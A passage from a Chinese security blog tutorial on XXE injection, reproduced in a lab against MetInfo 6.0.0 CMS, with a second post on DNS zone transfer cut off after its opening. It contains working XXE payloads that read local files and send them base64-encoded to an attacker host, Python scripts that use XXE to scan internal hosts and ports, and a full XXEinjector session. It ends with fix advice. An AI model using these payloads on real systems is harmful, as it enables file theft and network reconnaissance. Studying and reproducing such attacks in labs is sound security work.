src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>因为flag.txt文件中没有特殊符号，比如 &amp; &lt; &gt; ” ’ ，所以获取文件内容很顺利，如果把文件内容加点特殊符号，比如下面这个样子，在原来基础上加上左右尖括号：</p><pre class="line-numbers language-none"><code class="language-none">&lt;XXE Payload Executed Successfully!!!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时再访问就是这个样子：</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到当被读取文件中含有特殊符号时，不但没有预期想要的结果，还返回了一堆错误，这个时候就需要使用CDATA了，下面是引用WIKI中关于CDATA的介绍。</p><blockquote><p>CDATA，意为character data，是标记语言SGML与XML，表示文档的特定部分是普通的字符数据，而不是非字符数据或有特定、限定结构的字符数据。<br>在XML文档或外部实体中，一个CDATA section是一段按字面解释的内容，不作为标记文本。字符用CDATA节表示或者按照标准语法表示，并无差异。例如”&lt;” 与 “&amp;” 分别表示 “&lt;” 与 “&amp;”。</p></blockquote><p>其实简单一点的来说也就是说，将脚本代码定义为 “CDATA” 后，CDATA 部分中的内容就会被解析器忽略，这个时候就可以读取文件了，那么接下来把Payload修改修改。</p><h3 id="CDATA-Payload（在本地）"><a href="#CDATA-Payload（在本地）" class="headerlink" title="CDATA Payload（在本地）"></a>CDATA Payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;192.168.10.30&#x2F;evil.dtd&quot;&gt;  #本地IP%dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="evil-dtd（在本地）"><a href="#evil-dtd（在本地）" class="headerlink" title="evil.dtd（在本地）"></a>evil.dtd（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>利用带有CDATA的Payload，可以看到特殊符号被成功绕过。</p><p>不过在正常环境中，服务器上的XML就不是用来输出的，XML文件一般都是用于配置或者在一些极端条件下才能刚好实例化解析XML的类，因此在现实环境中利用这个漏洞就需要找到不依靠回显的方法。</p><h2 id="2、无回显读取本地敏感文件-Blind-XXE"><a href="#2、无回显读取本地敏感文件-Blind-XXE" class="headerlink" title="2、无回显读取本地敏感文件 (Blind XXE)"></a>2、无回显读取本地敏感文件 (Blind XXE)</h2><h3 id="xxe-test-php（在靶机）-1"><a href="#xxe-test-php（在靶机）-1" class="headerlink" title="xxe_test.php（在靶机）"></a>xxe_test.php（在靶机）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?phplibxml_disable_entity_loader (false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="evil-dtd（在本地）-1"><a href="#evil-dtd（在本地）-1" class="headerlink" title="evil.dtd（在本地）"></a>evil.dtd（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;192.168.10.30:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;  #本地IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Payload（在本地）"><a href="#Payload（在本地）" class="headerlink" title="Payload（在本地）"></a>Payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.10.30&#x2F;evil.dtd&quot;&gt;  #本地IP%remote;%int;%send;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在evil.dtd中表示把返回数据传到本地的9999端口中，因此用nc监听9999端口就能看到靶机返回的数据，下图中红框标注的数据用base64解码便是靶机上 “c:/flag.txt” 的内容。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>至于为什么返回数据是base64编码，也是为了不破环原来的XML语法，如果不编码则会报错。</p><p>关于这个 Blind XXE 利用方式的更多脑洞可以参阅文章底部的参考文章。</p><h2 id="3、HTTP内网主机探测"><a href="#3、HTTP内网主机探测" class="headerlink" title="3、HTTP内网主机探测"></a>3、HTTP内网主机探测</h2><p>话不多说，直接Show me the code，下面代码是我在前人的基础上做了一些修改，运行时注意代码为Python3代码。</p><h3 id="Payload（在本地）-1"><a href="#Payload（在本地）-1" class="headerlink" title="Payload（在本地）"></a>Payload（在本地）</h3><pre class="line-numbers language-none"><code class="language-none">import requestsimport base64def XXE(ip,string):try:xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;x &#x3D; requests.post(&#39;http:&#x2F;&#x2F;192.168.38.132&#x2F;xxe_test.php&#39;, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text#记得修改靶机地址coded_string &#x3D; x.split(&#39; &#39;)[-2]print(&#39; [+]&#39;,ip,&#39;Successfully Found !!!&#39;)except:print(&#39; [-]&#39;,ip,&#39;Error&#39;)passif __name__ &#x3D;&#x3D; &#39;__main__&#39;:headers &#x3D; &#123;&#39;Content-Type&#39;:&#39;application&#x2F;xml&#39;&#125;for i in range(1,255):ip &#x3D; &#39;192.168.38.&#39; + str(i) #记得修改IP段string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;XXE(ip,string)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>讲道理，代码运行着还是挺慢的，当时想着用多线程，但是发现用多线程速度相差也不大，所以多线程的代码就不放了，感兴趣的读者可以自己尝试着对代码进行优化，如果遇到什么问题也可以在我的公众号 “TeamsSix” 进行留言。</p><p>另外如果读者想要复现的话，记得修改代码中的IP，靶机上的 xee_test.php 和之前Normal XXE利用的内容一致即可。</p><p>上面的Payload运行起来就是这个样子：</p><pre class="line-numbers language-none"><code class="language-none"> ~# python3 inhostscan.py [+] 192.168.38.1 Successfully Found !!! [+] 192.168.38.2 Successfully Found !!! [-] 192.168.38.3 Error [-] 192.168.38.4 Error……内容太多，此处省略…… [-] 192.168.38.128 Error [+] 192.168.38.129 Successfully Found !!! [-] 192.168.38.130 Error [-] 192.168.38.131 Error [+] 192.168.38.132 Successfully Found !!! [-] 192.168.38.133 Error [-] 192.168.38.134 Error……内容太多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果运行代码的时候报错提示没有安装模块，直接根据报错提示安装对应模块即可。</p><h2 id="4、HTTP内网主机端口扫描"><a href="#4、HTTP内网主机端口扫描" class="headerlink" title="4、HTTP内网主机端口扫描"></a>4、HTTP内网主机端口扫描</h2><p>找到了内网的主机，还需要对其端口进行扫描，原理和上面一致，只不过IP固定，遍历端口，对于端口是否开放可以根据响应时间判断，下面放出Payload。</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><pre class="line-numbers language-none"><code class="language-none">import requestsimport base64def XXE(port):xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;192.168.38.129:&quot;&quot;&quot; + str(port) + &quot;&quot;&quot;&#x2F;&quot; [&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ELEMENT data (#PCDATA)&gt; &quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;]&gt;&quot;&quot;&quot;xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;data&gt;7&lt;&#x2F;data&gt;&quot;&quot;&quot;r &#x3D; requests.post(&#39;http:&#x2F;&#x2F;192.168.38.132&#x2F;xxe_test.php&#39;, data&#x3D;xml,timeout&#x3D;5)#记得修改靶机地址print(port,r.elapsed.total_seconds())if __name__ &#x3D;&#x3D; &#39;__main__&#39;:for i in range(1,65535):XXE(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Payload运行起来就是这个样子：</p><pre class="line-numbers language-none"><code class="language-none">~# python portscan.py1 1.0147032 1.01378……内容太多，此处省略……21 1.03933722 0.02089523 1.022882……内容太多，此处省略……110 1.033751111 0.008634112 1.038774……内容太多，此处省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以很明显的发现 22 端口和 111 端口的响应时间远小于其他端口，根据此特征便可以判断 22、110 端口是开启的，不过也可以用Burp对端口进行爆破，Payload如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  &lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;192.168.38.129:22&#x2F;&quot; [  &lt;!ELEMENT data (#PCDATA)&gt;  ]&gt;&lt;data&gt;7&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要把上面的Payload以端口进行遍历即可，但我没有找到Burp爆破结果以响应时间排序的方法，所以我还是选择用Python。</p><h1 id="0x02-XXE实例（MetInfo6-0-0-CMS）"><a href="#0x02-XXE实例（MetInfo6-0-0-CMS）" class="headerlink" title="0x02 XXE实例（MetInfo6.0.0 CMS）"></a>0x02 XXE实例（MetInfo6.0.0 CMS）</h1><h2 id="0、复现环境-1"><a href="#0、复现环境-1" class="headerlink" title="0、复现环境"></a>0、复现环境</h2><p>a、目标靶机</p><p>IP：192.168.38.132</p><p>环境：Win7 + phpstudy + apache + php</p><p>b、本地主机</p><p>IP：192.168.5.9、192.168.38.129</p><p>环境：Win10 +  Kali + phpstudy + apache + BurpSuite + Python3 + Ruby</p><blockquote><p>注意：为了便于理解，笔者在部分地方添加了注释，如果读者想要复现文中内容，记得删除注释再使用，避免复现失败。</p></blockquote><h2 id="1、本地搭建"><a href="#1、本地搭建" class="headerlink" title="1、本地搭建"></a>1、本地搭建</h2><p>靶场下载地址：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.metinfo.cn&#x2F;upload&#x2F;file&#x2F;MetInfo6.0.0.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载解压，取消文件夹只读权限，把解压文件放到WWW目录下。<br>接下来访问靶机的IP地址，跟着CMS的提示一步一步走，很容易就能搭建成功，如果是Linux环境，建议使用宝塔安装，比较方便。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、XXE测试"><a href="#2、XXE测试" class="headerlink" title="2、XXE测试"></a>2、XXE测试</h2><p>直接上工具 XXEinjector，工具地址：</p><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;github.com&#x2F;enjoiz&#x2F;XXEinjector<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的工具使用命令：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;XXEinjector.rb --host&#x3D;192.168.38.129 --file&#x3D;metlnfo_req.txt --path&#x3D;C:&#x2F;flag.txt --verbose --httpport&#x3D;999 --oob&#x3D;http --phpfilter<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里解释一下各个参数的意思</p><pre class="line-numbers language-none"><code class="language-none">--host 指定本地IP地址，即反向连接地址，注意不是靶机地址--file 指定发送目标的请求包，这里我的请求包内容放在了下面--path 指定指定要遍历的目录或文件，如果想遍历目录则需要目标是java环境，如果是单一文件，则哪种环境都行--verbose 显示详细信息，可以显示攻击数据包等，推荐使用--httpport 指定本地监听端口，默认80，这个也就是指定本地IP地址的端口--oob out of band方式提供ftp(默认)、http、gopher三种协议，在我自己的本地测试发现只有使用http方协议才能正常返回数据--phpfilter 使用PHP filter对检索文件进行Base64编码，这个参数不加上可能数据无法返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我这里 –file 参数指定发送目标的请求包如下，如果笔者想要复现则需要修改IP成自己的，另外需要注意，请求包中的 “XXEINJECT” 为工具的标记注入点</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;member&#x2F;index.php?a&#x3D;donotify&amp;m&#x3D;web&amp;c&#x3D;pay&amp;n&#x3D;pay HTTP&#x2F;1.1Host: 192.168.38.132  #目标IPUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip,deflateContent-Type: text&#x2F;xmlReferer: http:&#x2F;&#x2F;192.168.38.132&#x2F;  #目标IPX-Requested-With: XMLHttpRequestDNT: 1Connection: closePragma: no-cacheCache-Control: no-cacheContent-Length: 25XXEINJECT&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的是XXEinjector需要Ruby语言支持，因为Kali自带Ruby语言环境，这里我就直接用Kali了，接下来就让我们愉快的使用工具吧。</p><pre class="line-numbers language-none"><code class="language-none">root@kali:~# .&#x2F;XXEinjector.rb --host&#x3D;192.168.38.129 --file&#x3D;metlnfo_req.txt --path&#x3D;C:&#x2F;flag.txt --verbose --httpport&#x3D;999 --oob&#x3D;http --phpfilterXXEinjector by Jakub PałaczyńskiEnumeration options:&quot;y&quot; - enumerate currect file (default)&quot;n&quot; - skip currect file&quot;a&quot; - enumerate all files in currect directory&quot;s&quot; - skip all files in currect directory&quot;q&quot; - quit[+] Sending request with malicious XML:http:&#x2F;&#x2F;192.168.38.132:80&#x2F;member&#x2F;index.php?a&#x3D;donotify&amp;m&#x3D;web&amp;c&#x3D;pay&amp;n&#x3D;pay&#123;&quot;User-Agent&quot;&#x3D;&gt;&quot;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0&quot;, &quot;Accept&quot;&#x3D;&gt;&quot;application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01&quot;, &quot;A8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2&quot;, &quot;Accept-Encoding&quot;&#x3D;&gt;&quot;gzip,deflate&quot;, &quot;Content-Type&quot;&#x3D;&gt;&quot;text&#x2F;xml&quot;, &quot;Referer&quot;&#x3D;&gt;&quot;http:&#x2F;&#x2F;192.168.38.132&#x2F;&quot;, &quot;X-Requested-W&quot;1&quot;, &quot;Connection&quot;&#x3D;&gt;&quot;close&quot;, &quot;Pragma&quot;&#x3D;&gt;&quot;no-cache&quot;, &quot;Cache-Control&quot;&#x3D;&gt;&quot;no-cache&quot;, &quot;Content-Length&quot;&#x3D;&gt;&quot;119&quot;&#125;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.38.129:999&#x2F;file.dtd&quot;&gt;%remote;%int;%trick;]&gt;&lt;data&gt;4&lt;&#x2F;data&gt;[+] Got request for XML:GET &#x2F;file.dtd HTTP&#x2F;1.0[+] Responding with XML for: C:&#x2F;flag.txt[+] XML payload sent:&lt;!ENTITY % payl SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;192.168.38.129:999&#x2F;?p&#x3D;%payl;&#39;&gt;&quot;&gt;[+] Response with file&#x2F;directory content received:GET &#x2F;?p&#x3D;WFhFIFBheWxvYWQgRXhlY3V0ZWQgU3VjY2Vzc2Z1bGx5ISEh HTTP&#x2F;1.0[+] Retrieved data:[+] Nothing else to do. Exiting.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到工具已经将C:/flag.txt文件内容以base64编码的形式返回回来了，此时在工具的目录下会生成一个目录，里面保存着刚才读取文件的明文数据</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>XXEinjector 的功能远不止读个文件这么简单，还有其他更高级的功能，比如枚举目标端口、获取目标hash等等，在本文中关于 XXEinjector 就介绍到这里</p><p>不过既然 XXEinjector 可以很方便的利用这个漏洞，那在这里使用Burp可不可以呢？</p><p>我们先把 XXEinjector 所利用的Payload复制到Burp中，并把IP修改成自己的本地IP</p><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;192.168.5.9&#x2F;evil.dtd&quot;&gt;%remote;%int;%trick;]&gt;  #本地IP&lt;data&gt;4&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在本地www目录下写入evil.dtd文件，并开启本地的Web服务，这几步和本文前半部分的Blind XEE的套路都是一样的。</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % payl SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;C:&#x2F;flag.txt&quot;&gt;  #要读取的文件&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;192.168.5.9&#x2F;?p&#x3D;%payl;&#39;&gt;&quot;&gt;  #本地IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用Burp发送数据包，但是靶机只是显示了200，并没有返回什么数据</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这个时候打开本地的日志看看，注意是本地的日志，不是靶机，我的日志目录在Apache2.4.39\logs下，打开之后同样可以看到C:/flag.txt文件以base64编码的内容的</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果不想在日志中查看返回数据，修改evil.dtd中的本地IP端口与nc监听端口一致后，同样可以看到返回数据。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/xxe10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>虽然说使用 XXEinjector 还是 Burp 都是可以成功复现，不过很明显使用 XXEinjector 更为方便。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><h2 id="1、过滤用户提交的XML数据"><a href="#1、过滤用户提交的XML数据" class="headerlink" title="1、过滤用户提交的XML数据"></a>1、过滤用户提交的XML数据</h2><pre class="line-numbers language-none"><code class="language-none">过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、PHP下"><a href="#2、PHP下" class="headerlink" title="2、PHP下"></a>2、PHP下</h2><pre class="line-numbers language-none"><code class="language-none">libxml_disable_entity_loader(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、JAVA下"><a href="#3、JAVA下" class="headerlink" title="3、JAVA下"></a>3、JAVA下</h2><pre class="line-numbers language-none"><code class="language-none">DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4、Python下"><a href="#4、Python下" class="headerlink" title="4、Python下"></a>4、Python下</h2><pre class="line-numbers language-none"><code class="language-none">from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><blockquote><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a><br><a href="https://zh.wikipedia.org/wiki/XML">https://zh.wikipedia.org/wiki/XML</a><br><a href="https://zh.wikipedia.org/zh-cn/CDATA">https://zh.wikipedia.org/zh-cn/CDATA</a><br><a href="https://forum.90sec.com/t/topic/239/2">https://forum.90sec.com/t/topic/239/2</a><br><a href="https://cloud.tencent.com/developer/article/1196122">https://cloud.tencent.com/developer/article/1196122</a><br><a href="https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/">https://museljh.github.io/2019/02/26/%E5%AF%B9%E4%BA%8EXXE%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BD%AC%E8%BD%BD%EF%BC%89/</a><br>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> 漏洞笔记 </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【漏洞复现】DNS域传送漏洞</title>
      <link href="//191206-172901.html"/>
      <url>//191206-172901.html</url>
      
        <content type="html"><![CDATA[<p>注：本文中使用的域名是不存在DNS域传送漏洞的，本文仅用作技术交流学习用途，严禁将该文内容用于违法行为。</p><a id="more"></a><h1 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h1><p>DNS: 网域名称系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。</p><p>它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p><p>DNS使用TCP和UDP端口53，当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p>常用的DNS记录有以下几类：</p><pre class="line-numbers language-none"><code class="language-none">主机记录(A记录)：A记录是用于名称解析的重要记录，它将特定的主机名映射到对应主机的IP地址上。IPv6主机记录(AAAA记录)：与A记录对应，用于将特定的主机名映射到一个主机的IPv6地址。 别名(CNAME记录)：CNAME记录用于将某个别名指向到某个A记录上，这样就不需要再为某个新名字另外创建一条新的A记录。电子邮件交换记录（MX记录)：记录一个邮件域名对应的IP地址域名服务器记录 (NS记录)：记录该域名由哪台域名服务器解析反向记录(PTR记录):也即从IP地址到域名的一条记录TXT记录：记录域名的相关文本信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DNS服务器分为主服务器，备份服务器，缓存服务器。</p><p>备份服务器需要利用“域传送”从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，万一主服务器挂了还有备份服务器顶着。</p><p>而“域传送”漏洞则是由于dns配置不当，本来只有备份服务器能获得主服务器的数据，由于漏洞导致任意client都能通过“域传送”获得主服务器的数据（zone数据库信息）。</p><p>这样，攻击者就能获得某个域的所有记录，甚至整个网络拓扑都暴露无遗，凭借这份网络蓝图，攻击者可以节省很多扫描时间以及信息收集的时间，还提升了准确度等等。</p><p>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用 Private DNS。如果内部 DNS 泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部网络沦陷。</p><h1 id="0x01-漏洞利用"><a 